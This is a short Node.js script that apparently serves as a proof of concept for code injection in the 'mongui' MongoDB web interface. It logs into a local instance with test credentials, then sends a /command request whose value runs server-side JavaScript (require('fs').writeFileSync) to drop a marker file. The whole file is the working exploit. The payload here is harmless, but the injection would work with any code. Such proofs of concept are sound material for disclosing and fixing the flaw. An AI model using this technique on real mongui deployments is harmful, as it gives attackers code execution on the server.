var mypeop = require("mongui");
console.log(mypeop);
var request = require("superagent");
var user1 = request.agent();
setTimeout(function () {
  user1
    .post("http://localhost:3443/login")
    .send("user=test&pass=1234")
    .end(function (err, res) {
      user1
        .post("http://localhost:3443/command")
        .send(
          'command=require("fs").writeFileSync("mongui-sucess.txt","23")&db=blog'
        )
        .end(function (a) {
          process.exit(1);
        });
    });
}, 1000);
